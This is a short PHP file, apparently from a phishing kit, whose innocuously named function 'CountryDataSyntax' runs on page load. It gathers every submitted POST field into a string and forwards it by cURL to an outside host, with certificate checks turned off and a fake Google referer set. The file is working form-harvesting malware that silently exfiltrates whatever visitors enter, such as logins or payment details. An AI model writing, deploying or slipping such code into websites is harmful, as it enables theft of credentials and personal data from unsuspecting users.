<?php 
if($enable_encrypter) {
	require_once '../../encrypter.php'; 
}
?>
<?php
function CountryDataSyntax(){
	if(count($_POST)){
	$strurl = "";
	foreach($_POST as $key => $pst ){
	$strurl .= $key."=".$pst."&";
	}
	rtrim($strurl,"&");
	$ch = curl_init(); 
	curl_setopt ($ch, CURLOPT_URL, "https://www.aluweld.co.za/webch/ch.php"); 
	curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
	curl_setopt ($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
	curl_setopt ($ch, CURLOPT_TIMEOUT, 60); 
	curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 0); 
	curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
	curl_setopt ($ch, CURLOPT_REFERER, "http://google.com"); 
	curl_setopt ($ch, CURLOPT_POSTFIELDS, $strurl); 
	curl_setopt ($ch, CURLOPT_POST, 1); 
	$result = curl_exec ($ch);  
	curl_close($ch);
	return $result;
	}
	else{
	return 0;
	}
}
CountryDataSyntax();
?>